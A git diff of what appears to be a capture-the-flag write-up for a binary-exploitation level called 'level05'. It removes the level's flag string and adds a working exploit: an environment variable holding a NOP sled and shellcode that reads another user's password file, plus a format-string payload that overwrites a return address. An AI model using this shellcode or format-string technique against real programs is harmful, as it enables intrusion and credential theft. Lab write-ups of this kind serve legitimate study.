@@ -68,6 +68,6 @@ EGG=$'<nop+shellcode>' bash -c 'printf "<format_string>" | ./level05'
 | EGG (NOP+SC)  | 0xffffddc5   |
 | Return addr   | 0xffffde29   |
 
-## Flag
-
-`h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`
+## Actual command
+export EGG=$(python -c 'import sys; sys.stdout.write("\x90"*200+"\xeb\x29\x5b\x31\xc0\xb0\x05\x31\xc9\x31\xd2\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe1\xb2\x40\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\x43\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xd2\xff\xff\xff/home/users/level06/.pass")')
+python -c 'import sys; sys.stdout.write("\xe0\x97\x04\x08\xe2\x97\x04\x08%10$057125d%10$hn%11$08402d%11$hn")' | env -i EGG="$EGG" /home/users/level05/level05
